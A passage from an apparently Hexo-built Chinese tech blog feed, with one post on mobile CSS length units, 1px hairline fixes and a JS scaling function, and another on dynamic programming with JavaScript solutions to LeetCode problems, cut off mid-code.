        <content type="html"><![CDATA[<ul><li>逻辑像素与物理像素</li><li>常见长度单位</li><li><p>移动端 1px</p></li><li><p>适配案例</p></li></ul><a id="more"></a><h2 id="逻辑像素与物理像素"><a href="#逻辑像素与物理像素" class="headerlink" title="逻辑像素与物理像素"></a>逻辑像素与物理像素</h2><ul><li>pt: html css中的使用的单位像素px: 实际上指的是逻辑像素pt</li><li>px: photoshop测量中的但是实际上指的是物理像素, 物理像素即表示的是一个点, 大小固定</li><li>一个pt可以包含多个物理像素px</li><li><p>在iphone6中一个单位的逻辑像素包含2个物理像素，iphone的分辨率为<code>375*667</code>实际上指的是逻辑像素为<code>375*667</code>, 所以一般移动端的设计图纸一般是给的是<code>750*1334</code>,  是因为一个逻辑像素pt包含两个物理像素px</p></li><li><p>不同设备下的分辨率不同, 在iphone6s中 一个逻辑像素pt包含三个物理像素px  即 1pt = 3px</p></li></ul><h2 id="常见长度单位"><a href="#常见长度单位" class="headerlink" title="常见长度单位"></a>常见长度单位</h2><h3 id="em"><a href="#em" class="headerlink" title="em"></a>em</h3><p>em是相对长度单位。它的单位长度是根据元素的文本垂直长度来决定的。可以作用在width、height、line-height、margin、padding、border等样式的设置上。 如当前对行内文本的字体尺寸未被人为设置，则相对于浏览器的默认字体尺寸。 默认1em=16px。如果在body选择器中声明font-size=62.5%,则1em=10px。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css"><span class="selector-class">.parent</span>&#123; </span></span><br><span class="line"><span class="css"><span class="selector-tag">font-size</span><span class="selector-pseudo">:5em</span>; <span class="comment">/*80px*/</span></span></span><br><span class="line"><span class="css"><span class="selector-tag">height</span><span class="selector-pseudo">:10em</span>;<span class="comment">/*800px*/</span></span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css">  <span class="selector-class">.child</span>&#123;</span></span><br><span class="line"><span class="css"><span class="selector-tag">font-size</span><span class="selector-pseudo">:2em</span>;<span class="comment">/*160px*/</span></span></span><br><span class="line"><span class="css"><span class="selector-tag">height</span><span class="selector-pseudo">:2em</span>;<span class="comment">/*320px*/</span></span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"parent"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"child"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在不设置元素font-size的情况下，em总是根据父元素的font-size来确定长度；即使元素设置了font-size，多次嵌套使用em也往往会造成疏忽，不仅使用前需要大量计算，而且不能保证没有漏网之鱼。这将是一个繁杂而低效率的工作。 于是有了rem.</p><h3 id="rem"><a href="#rem" class="headerlink" title="rem"></a>rem</h3><p>rem不是依据父元素——而是依据根元素（root element）来确定其长度。</p><p>我们一般给根元素设置一个容易计算的font-size</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">    html &#123;</span></span><br><span class="line"><span class="css">        <span class="selector-tag">font-size</span>: 62<span class="selector-class">.5</span>%;   <span class="comment">/* 10px */</span></span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">    div &#123;</span></span><br><span class="line"><span class="css">        <span class="selector-tag">font-size</span>: 2<span class="selector-class">.4rem</span>;  <span class="comment">/* 24px */</span></span></span><br><span class="line"><span class="css">        <span class="selector-tag">width</span>: 64<span class="selector-tag">rem</span>;   <span class="comment">/* 640px */</span></span></span><br><span class="line"><span class="css">        <span class="selector-tag">border</span>: 0<span class="selector-class">.1rem</span> <span class="selector-tag">solid</span> <span class="selector-id">#ccc</span>;  <span class="comment">/* 1px */</span></span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"div1"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"div2"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="rpx"><a href="#rpx" class="headerlink" title="rpx"></a>rpx</h3><table><thead><tr><th style="text-align:left">设备</th><th style="text-align:left">rpx换算px (屏幕宽度/750)</th><th style="text-align:left">px换算rpx (750/屏幕宽度)</th></tr></thead><tbody><tr><td style="text-align:left">iPhone5</td><td style="text-align:left">1rpx = 0.42px</td><td style="text-align:left">1px = 2.34rpx</td></tr><tr><td style="text-align:left">iPhone6</td><td style="text-align:left">1rpx = 0.5px</td><td style="text-align:left">1px = 2rpx</td></tr><tr><td style="text-align:left">iPhone6 Plus</td><td style="text-align:left">1rpx = 0.552px</td><td style="text-align:left">1px = 1.81rpx</td></tr></tbody></table><ul><li>rpx（responsive pixel）: 可以根据屏幕宽度进行自适应。规定屏幕宽为750rpx。如在 iPhone6 上，屏幕宽度为375px，共有750个物理像素，则750rpx = 375px = 750物理像素，1rpx = 0.5px = 1物理像素。</li><li>建议小程序的设计稿以750 x 1334 的物理分辨率进行设计</li></ul><h3 id="vw-vh"><a href="#vw-vh" class="headerlink" title="vw,vh"></a>vw,vh</h3><ul><li>vw和vh是css3中的新单位，是一种视窗单位，在小程序中也同样适用。</li><li>小程序中，窗口宽度固定为100vw，将窗口宽度平均分成100份，1份是1vw</li><li>小程序中，窗口高度固定为100vh ，将窗口高度平均分成100份，1份是1vh</li><li>所以，我们在小程序中也可以使用vw、vh作为尺寸单位使用在布局中进行布局，但是一般情况下，百分比+rpx就已经足够使用了,所以它们的出场机会很少。</li></ul><h2 id="移动端-1px"><a href="#移动端-1px" class="headerlink" title="移动端 1px"></a>移动端 1px</h2><h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><ul><li>DPR(devicePixelRatio) 设备像素比 = 物理像素 / css像素 ，它是默认缩放为100%的屏幕下，设备像素和css像素的比值。</li><li>目前比较主流的设备的DPR=2或3，所以： 当我们的DPR为2，也就是2倍屏时，当物理像素（设备像素）为1px的时候，我们的css像素应该是0.5px。当DPR=3，物理像素为1px时，css像素应该为1/3px。</li></ul><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><h4 id="scale"><a href="#scale" class="headerlink" title="scale"></a>scale</h4><p>如果在一个元素上使用<code>scale</code>时会导致整个元素同时缩放，所以应该在该元素的伪元素下设置<code>scale</code>属性。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.scale</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: block;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">''</span>;</span><br><span class="line">    <span class="attribute">border-bottom</span>: <span class="number">1px</span> solid <span class="number">#000</span>;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scaleY</span>(.5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="linear-gradient"><a href="#linear-gradient" class="headerlink" title="linear-gradient"></a>linear-gradient</h4><p>通过线性渐变，也可以实现移动端1px的线。原理大致是使用渐变色，上部分为白色，下部分为黑色。这样就可以将线从视觉上看只有1px。</p><p>由于是通过背景颜色渐变实现的，所以这里要使用伪元素并且设置伪元素的高度。 当然，也可以不使用伪元素，但是就会增加一个没有任何意义的空标签了。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span><span class="selector-class">.linear</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: block;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">''</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">1px</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">linear-gradient</span>(0, #fff, #000);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="box-shadow"><a href="#box-shadow" class="headerlink" title="box-shadow"></a>box-shadow</h4><p>通过<code>box-shaodow</code>来实现1px也可以，实现原理是将纵坐标的shadow设置为0.5px即可。<code>box-shadow</code>属性在Chrome和Firefox下支持小数设置，但是在Safari下不支持。所以使用该方法设置移动端1px时应该慎重使用。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span><span class="selector-class">.shadow</span> &#123;</span><br><span class="line">    <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0.5px</span> <span class="number">0</span> <span class="number">0</span> <span class="number">#000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="适配案例"><a href="#适配案例" class="headerlink" title="适配案例"></a>适配案例</h2><p><strong>设计给出750px的设计稿，也按照750px来开发h5页面，怎么在小程序的 webview 页面中适配？</strong></p><ul><li>transform: scale</li><li>hack 为占满全屏的透明盒子，因为小程序存在顶部栏，所以不能用 screenHeight</li><li>toFixed 是为了取整，防止小数出现 bug</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">autoAdapt</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> screenWidth = hack.offsetWidth</span><br><span class="line">        <span class="keyword">var</span> screenHeight = hack.offsetHeight</span><br><span class="line">        <span class="keyword">var</span> scale = (screenWidth / <span class="number">750</span>).toFixed(<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> (scale &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            main.style.width = <span class="string">`<span class="subst">$&#123;(screenWidth <span class="regexp">/ scale).toFixed(0)&#125;px`</span></span></span></span><br><span class="line"><span class="string"><span class="subst"><span class="regexp">            main.style.height = `$&#123;(screenHeight /</span> scale).toFixed(<span class="number">0</span>)&#125;</span>px`</span></span><br><span class="line">            main.style.overflow = <span class="string">'auto'</span></span><br><span class="line">            <span class="built_in">document</span>.body.style.transform = <span class="string">`scale(<span class="subst">$&#123;scale&#125;</span>)`</span></span><br><span class="line">            <span class="built_in">document</span>.body.style.transformOrigin = <span class="string">'0% 0%'</span></span><br><span class="line">            <span class="built_in">document</span>.body.style.overflow = <span class="string">`hidden`</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            main.style.transform = <span class="string">`scale(<span class="subst">$&#123;scale&#125;</span>)`</span></span><br><span class="line">            main.style.transformOrigin = <span class="string">'50% 0%'</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    autoAdapt()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">window</span>.onresize = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        autoAdapt()</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 移动端 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>算法-动态规划</title>
      <link href="2020/11/16/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
      <url>2020/11/16/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/</url>
      
        <content type="html"><![CDATA[<ul><li>爬楼梯</li><li>最大子序列和</li><li>最长回文子串</li><li>不同路径</li><li>最小路径和</li><li>正则表达式匹配</li></ul><a id="more"></a><blockquote><p>动态规划的三个概念：最优子结构，边界，状态转移方程</p></blockquote><h2 id="爬楼梯"><a href="#爬楼梯" class="headerlink" title="爬楼梯"></a>爬楼梯</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有一座高度是10级台阶的楼梯，从下往上走，每跨一步只能向上1级或者2级台阶。要求用程序来求出一共有多少种走法。</span><br></pre></td></tr></table></figure><ul><li>思考：如果只差最后一步就走到第 10 级，此时分为两种：从第 9 级到 10 级，从第 8 级到 10 级</li><li>0 到 9 级的走法有 x，0 到 8 级的走法有 y 种，那么 0 到 10 级的走法一共有 x+y</li><li>F(10) = F(9) + F(8)，F(8) = F(8) + F(7)</li><li>F(9) 和 F(8) 是 F(10) 的最优子结构</li><li>边界是 F(1) 和 F(2)</li><li>状态转移方程是 F(n) = F(n-1) + F(n-2)</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getClimbingWays</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> (n === <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> (n === <span class="number">2</span>) <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">let</span> a = <span class="number">1</span>, b = <span class="number">2</span>, temp = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">3</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        temp = a + b</span><br><span class="line">        a = b</span><br><span class="line">        b = temp</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> temp</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="最大子序列和"><a href="#最大子序列和" class="headerlink" title="最大子序列和"></a>最大子序列和</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">给定一个整数数组 nums ，找到一个具有最大和的连续子数组（子数组最少包含一个元素），返回其最大和。</span><br><span class="line"></span><br><span class="line">示例:</span><br><span class="line"></span><br><span class="line">输入: [-2,1,-3,4,-1,2,1,-5,4]</span><br><span class="line">输出: 6</span><br><span class="line">解释: 连续子数组 [4,-1,2,1] 的和最大，为 6。</span><br></pre></td></tr></table></figure><ul><li>分析：答案肯定是在以下组合中：</li><li>第一个子组合是以第一个数字结尾的连续序列，也就是[-2]，最大值-2</li><li>第二个子组合是以第二个数字结尾的连续序列，也就是[-2,1], [1]，最大值1</li><li>第三个子组合是以第三个数字结尾的连续序列，也就是[-2,1,-3], [1,-3], [-3]，最大值-2</li><li>第四个子组合是以第四个数字结尾的连续序列，也就是[-2,1,-3,4],[1.-3,4],[-3,4],[4]，最大值4</li><li>第n个子组合……</li></ul><hr><ul><li>最优子结构：组合n只是在组合n-1的基础上每一个数组后面添加1个数字num，然后增加一个只有第n个数字的数组[num]，只需要比较前一个组合的最大值+num和num</li><li>边界：dp[0] = nums[0] = -2</li><li>状态转移方程：dp[i] = max(dp[i-1]+nums[i], nums[i])</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 组合3只是在组合2的基础上每一个数组后面添加第3个数字，也就是3，然后增加一个只有第三个数字的数组[3]</span></span><br><span class="line"><span class="comment">// 只需要比较前一个组合的最大值+num和num</span></span><br><span class="line"><span class="comment">// 计算出九个组合的最大值，再取最大的即可</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> maxSubArray = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> dp = []</span><br><span class="line">    <span class="keyword">let</span> result = nums[<span class="number">0</span>]</span><br><span class="line">    dp[<span class="number">0</span>] = nums[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">        dp[i] = <span class="built_in">Math</span>.max(dp[i<span class="number">-1</span>]+nums[i],nums[i])</span><br><span class="line">        <span class="keyword">if</span>(dp[i] &gt; result) result = dp[i]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="最长回文子串"><a href="#最长回文子串" class="headerlink" title="最长回文子串"></a>最长回文子串</h2><ul><li><a href="https://leetcode-cn.com/problems/longest-palindromic-substring" target="_blank" rel="noopener">leetcode5</a></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">给定一个字符串 s，找到 s 中最长的回文子串。你可以假设 s 的最大长度为 1000。</span><br><span class="line"></span><br><span class="line">示例 1：</span><br><span class="line">输入: &quot;babad&quot;</span><br><span class="line">输出: &quot;bab&quot;</span><br><span class="line">注意: &quot;aba&quot; 也是一个有效答案。</span><br><span class="line"></span><br><span class="line">示例 2：</span><br><span class="line">输入: &quot;cbbd&quot;</span><br><span class="line">输出: &quot;bb&quot;</span><br></pre></td></tr></table></figure><ul><li>分析：i 到 j 是回文子串那么 i+1 到 j-1 也是回文子串</li><li>i 到 j 的最优子结构就是 i+1 到 j-1</li><li>边界就是单个字符或者 aa 这种</li><li>状态转移方程是：<code>dp[i][j] = dp[i+1][j-1] &amp;&amp; s[i] == s[j]</code></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> longestPalindrome = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!s) <span class="keyword">return</span> <span class="string">""</span></span><br><span class="line">    <span class="keyword">let</span> res = [], dp = []</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从后向前遍历，因为 dp[i] 依赖于 dp [i+1]</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = s.length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        dp[i] = []</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = i; j &lt; s.length; j++) &#123;</span><br><span class="line">            <span class="comment">// 边界</span></span><br><span class="line">            <span class="keyword">if</span> (i === j || (j - i === <span class="number">1</span> &amp;&amp; s[i] === s[j])) &#123;</span><br><span class="line">                dp[i][j] = <span class="literal">true</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 状态转移</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (s[i] === s[j] &amp;&amp; dp[i + <span class="number">1</span>][j - <span class="number">1</span>]) &#123;</span><br><span class="line">                dp[i][j] = <span class="literal">true</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (dp[i][j] &amp;&amp; j - i + <span class="number">1</span> &gt; res.length) &#123;</span><br><span class="line">                res = s.slice(i, j + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="不同路径"><a href="#不同路径" class="headerlink" title="不同路径"></a>不同路径</h2><ul><li><a href="https://leetcode-cn.com/problems/unique-paths/" target="_blank" rel="noopener">leetcode62</a></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">一个机器人位于一个 m x n 网格的左上角 （起始点在下图中标记为“Start” ）。</span><br><span class="line"></span><br><span class="line">机器人每次只能向下或者向右移动一步。机器人试图达到网格的右下角（在下图中标记为“Finish”）。</span><br><span class="line"></span><br><span class="line">问总共有多少条不同的路径？</span><br><span class="line"></span><br><span class="line">示例 1:</span><br><span class="line">输入: m = 3, n = 2</span><br><span class="line">输出: 3</span><br><span class="line">解释:</span><br><span class="line">从左上角开始，总共有 3 条路径可以到达右下角。</span><br><span class="line">1. 向右 -&gt; 向右 -&gt; 向下</span><br><span class="line">2. 向右 -&gt; 向下 -&gt; 向右</span><br><span class="line">3. 向下 -&gt; 向右 -&gt; 向右</span><br><span class="line"></span><br><span class="line">示例 2:</span><br><span class="line">输入: m = 7, n = 3</span><br><span class="line">输出: 28</span><br></pre></td></tr></table></figure><ul><li>分析：到达终点总是向右或向下，故到达终点的走法=到达其上面点的走法 + 到达其左面点的走法</li><li>状态转移：<code>map[m][n] = map[m-1][n] + map[m][n-1]</code></li><li>边界：<code>map[0][j] = 1,map[i][0] = 1</code></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 初始化二维数组</span></span><br><span class="line">   <span class="keyword">let</span> map = <span class="built_in">Array</span>.from(<span class="keyword">new</span> <span class="built_in">Array</span>(m),()=&gt;(<span class="keyword">new</span> <span class="built_in">Array</span>(n).fill(<span class="number">0</span>)))</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">       map[<span class="number">0</span>][j] = <span class="number">1</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">       map[i][<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; m; i++) &#123;</span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">           map[i][j] = map[i<span class="number">-1</span>][j] + map[i][j<span class="number">-1</span>]</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> map[m<span class="number">-1</span>][n<span class="number">-1</span>]</span><br></pre></td></tr></table></figure><h4 id="Array-from"><a href="#Array-from" class="headerlink" title="Array.from"></a>Array.from</h4><p><strong>将一个类数组对象或者可遍历对象转换成一个真正的数组。</strong></p><ul><li><p>该类数组对象必须具有length属性，用于指定数组的长度。如果没有length属性，那么转换后的数组是一个空数组。</p></li><li><p>该类数组对象的属性名必须为数值型或字符串型的数字</p></li><li><p>该类数组对象的属性名可以加引号，也可以不加引号</p></li><li><code>Array.from</code>可以接受第二个参数，作用类似于数组的<code>map</code>方法，用来对每个元素进行处理，将处理后的值放入返回的数组。</li></ul><h2 id="最小路径和"><a href="#最小路径和" class="headerlink" title="最小路径和"></a>最小路径和</h2><ul><li><a href="https://leetcode-cn.com/problems/minimum-path-sum/" target="_blank" rel="noopener">leetcode64</a></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">给定一个包含非负整数的 m x n 网格 grid ，请找出一条从左上角到右下角的路径，使得路径上的数字总和为最小。</span><br><span class="line"></span><br><span class="line">说明：每次只能向下或者向右移动一步。</span><br><span class="line"></span><br><span class="line">示例 1：</span><br><span class="line">输入：grid = [[1,3,1],[1,5,1],[4,2,1]]</span><br><span class="line">输出：7</span><br><span class="line">解释：因为路径 1→3→1→1→1 的总和最小。</span><br><span class="line"></span><br><span class="line">示例 2：</span><br><span class="line">输入：grid = [[1,2,3],[4,5,6]]</span><br><span class="line">输出：12</span><br></pre></td></tr></table></figure><ul><li>思路：到<code>grid[i][j]</code>的最小值，肯定等于到<code>grid[i-1][j]</code>的最小值和到<code>grid[i][j-1]</code>的最小值中较小的加上当前<code>grid[i][j]</code>的值</li><li>最优子结构：<code>dp[i-1][j], dp[i][j-1]</code>中小的那个</li><li>边界：<code>dp[0][0] = grid[0][0]</code></li><li>状态转移方程：<code>dp[i][j] = min(dp[i-1][j], dp[i][j-1]) + grid[i][j]</code>；</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> minPathSum = <span class="function"><span class="keyword">function</span>(<span class="params">grid</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> m = grid.length</span><br><span class="line">    <span class="keyword">let</span> n = grid[<span class="number">0</span>].length</span><br><span class="line">    <span class="keyword">let</span> dp = <span class="built_in">Array</span>.from(<span class="keyword">new</span> <span class="built_in">Array</span>(m),()=&gt;(<span class="keyword">new</span> <span class="built_in">Array</span>(n).fill(<span class="number">0</span>)))</span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>] = grid[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; m; i++) &#123;</span><br><span class="line">        dp[i][<span class="number">0</span>] = dp[i<span class="number">-1</span>][<span class="number">0</span>] + grid[i][<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">        dp[<span class="number">0</span>][j] = dp[<span 